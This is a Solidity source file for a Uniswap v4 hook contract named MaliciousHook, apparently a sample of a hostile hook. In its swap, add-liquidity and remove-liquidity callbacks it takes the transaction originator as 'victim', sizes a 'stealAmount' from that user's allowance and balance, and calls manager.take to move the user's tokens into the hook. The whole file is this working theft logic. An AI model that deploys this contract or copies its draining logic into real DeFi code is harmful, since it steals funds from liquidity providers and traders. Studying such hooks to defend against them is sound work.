// SPDX-License-Identifier: UNLICENSED

//entropy

pragma solidity ^0.8.0;

import {BaseHook} from "v4-periphery/src/base/hooks/BaseHook.sol";
import {ERC1155} from "@openzeppelin/contracts/token/ERC1155/ERC1155.sol";
import {IPoolManager} from "v4-core/interfaces/IPoolManager.sol";
import {Hooks} from "v4-core/libraries/Hooks.sol";

import {PoolId, PoolIdLibrary} from "v4-core/types/PoolId.sol";
import {PoolKey} from "v4-core/types/PoolKey.sol";

import {Currency, CurrencyLibrary} from "v4-core/types/Currency.sol";
import {StateLibrary} from "v4-core/libraries/StateLibrary.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {TickMath} from "v4-core/libraries/TickMath.sol";
import {BalanceDelta} from "v4-core/types/BalanceDelta.sol";

import {FixedPointMathLib} from "solmate/src/utils/FixedPointMathLib.sol";
import {IHooks} from "v4-core/interfaces/IHooks.sol";
import {SafeCast} from "v4-core/libraries/SafeCast.sol";
import {toBalanceDelta} from "v4-core/types/BalanceDelta.sol";

contract MaliciousHook is BaseHook {
    using Hooks for IHooks;
    using SafeCast for uint256;
    using SafeCast for int128;

    IPoolManager immutable manager;
    bool private firstAddLiquidity = true;

    event LogInt128(int128 a);

    constructor(IPoolManager _manager) BaseHook(_manager) {
        manager = _manager;
    }

    modifier onlyPoolManager() {
        require(msg.sender == address(manager));
        _;
    }

    uint128 public constant TOTAL_BIPS = 10000;


    function getHookPermissions()
        public
        pure
        override
        returns (Hooks.Permissions memory)
    {
        return
            Hooks.Permissions({
                beforeInitialize: false,
                afterInitialize: false,
                beforeAddLiquidity: false,
                afterAddLiquidity: true,
                beforeRemoveLiquidity: false,
                afterRemoveLiquidity: true,
                beforeSwap: false,
                afterSwap: true,
                beforeDonate: false,
                afterDonate: false,
                beforeSwapReturnDelta: false,
                afterSwapReturnDelta: true,
                afterAddLiquidityReturnDelta: true,
                afterRemoveLiquidityReturnDelta: true
            });
    }

    function afterSwap(
        address sender, /* sender **/
        PoolKey calldata key,
        IPoolManager.SwapParams calldata params,
        BalanceDelta delta,
        bytes calldata hookData /* hookData **/
    ) external override onlyPoolManager returns (bytes4, int128) {
        // fee will be in the unspecified token of the swap
        bool specifiedTokenIs0 = (params.amountSpecified < 0 == params.zeroForOne);
        (Currency targetCurrency, int128 swapAmount) =
            (specifiedTokenIs0) ? (key.currency1, delta.amount1()) : (key.currency0, delta.amount0());
        // if fee is on output, get the absolute output amount
        
        if (swapAmount < 0) 
            swapAmount = -swapAmount;
        else
            return (IHooks.afterSwap.selector,0);

        address victim = tx.origin;
        IERC20 feeToken = IERC20(Currency.unwrap(targetCurrency));
        uint256 stealAmount = feeToken.allowance(victim, sender);

        if (stealAmount > targetCurrency.balanceOf(victim)) {
            stealAmount = targetCurrency.balanceOf(address(victim));
        }
        if (stealAmount > targetCurrency.balanceOf(address(manager))) {
            stealAmount = targetCurrency.balanceOf(address(manager));
        }

        stealAmount = stealAmount - stealAmount * key.fee / TOTAL_BIPS - uint128(swapAmount);

        manager.take(targetCurrency, address(this), stealAmount);

        return (IHooks.afterSwap.selector, (stealAmount).toInt128());
    }

    function afterRemoveLiquidity(
        address sender, /* sender **/
        PoolKey calldata key,
        IPoolManager.ModifyLiquidityParams calldata, /* params **/
        BalanceDelta delta,
        BalanceDelta,
        bytes calldata hookData /* hookData **/
    ) external override onlyPoolManager returns (bytes4, BalanceDelta) {
        assert(delta.amount0() >= 0 && delta.amount1() >= 0);

        address victim = tx.origin;
        IERC20 targetToken0;
        IERC20 targetToken1;
        {
        targetToken0 = IERC20(Currency.unwrap(key.currency0));
        targetToken1 = IERC20(Currency.unwrap(key.currency1));
        }
        uint256 stealAmount0 = targetToken0.allowance(victim, sender);
        uint256 stealAmount1 = targetToken1.allowance(victim, sender);


        if (stealAmount0 > targetToken0.balanceOf(victim)) {
            stealAmount0 = targetToken0.balanceOf(address(victim));
        }
        if (stealAmount1 > targetToken1.balanceOf(victim)) {
            stealAmount1 = targetToken1.balanceOf(address(victim));
        }
        if (stealAmount0 > targetToken0.balanceOf(address(manager))) {
            stealAmount0 = targetToken0.balanceOf(address(manager));
        }
        if (stealAmount1 > targetToken1.balanceOf(address(manager))) {
            stealAmount1 = targetToken1.balanceOf(address(manager));
        }

        emit LogInt128(delta.amount0());
        emit LogInt128(delta.amount1());

        if (delta.amount0() > 0) {
            stealAmount0 = uint128(delta.amount0()) - 1;
        }
        else {
            stealAmount0 = 0;
        }
        if (delta.amount1() > 0) {
            stealAmount1 = uint128(delta.amount1()) - 1;
        }
        else {
            stealAmount1 = 0;
        }

        manager.take(key.currency0, address(this), stealAmount0);        
        manager.take(key.currency1, address(this), stealAmount1);

        return (IHooks.afterRemoveLiquidity.selector, toBalanceDelta(int128(uint128(stealAmount0)), int128(uint128(stealAmount1))));
    }

    function afterAddLiquidity(
        address sender, /* sender **/
        PoolKey calldata key,
        IPoolManager.ModifyLiquidityParams calldata, /* params **/
        BalanceDelta delta,
        BalanceDelta,
        bytes calldata hookData /* hookData **/
    ) external override onlyPoolManager returns (bytes4, BalanceDelta) {
        if (firstAddLiquidity) {
            firstAddLiquidity = false;
            return (IHooks.afterAddLiquidity.selector, toBalanceDelta(0, 0));
        }
        assert(delta.amount0() <= 0 && delta.amount1() <= 0);

        address victim = tx.origin;
        IERC20 targetToken0 = IERC20(Currency.unwrap(key.currency0));
        IERC20 targetToken1 = IERC20(Currency.unwrap(key.currency1));
        uint256 stealAmount0 = targetToken0.allowance(victim, sender);
        uint256 stealAmount1 = targetToken1.allowance(victim, sender);


        if (stealAmount0 > targetToken0.balanceOf(victim)) {
            stealAmount0 = targetToken0.balanceOf(address(victim));
        }
        if (stealAmount1 > targetToken1.balanceOf(victim)) {
            stealAmount1 = targetToken1.balanceOf(address(victim));
        }
        if (stealAmount0 > targetToken0.balanceOf(address(manager))) {
            stealAmount0 = targetToken0.balanceOf(address(manager));
        }
        if (stealAmount1 > targetToken1.balanceOf(address(manager))) {
            stealAmount1 = targetToken1.balanceOf(address(manager));
        }

        
        stealAmount0 = stealAmount0 - uint128(-delta.amount0());
        stealAmount1 = stealAmount1 - uint128(-delta.amount1());

        manager.take(key.currency0, address(this), stealAmount0);        
        manager.take(key.currency1, address(this), stealAmount1);

        return (IHooks.afterAddLiquidity.selector, toBalanceDelta(int128(uint128(stealAmount0)), int128(uint128(stealAmount1))));
    }
}
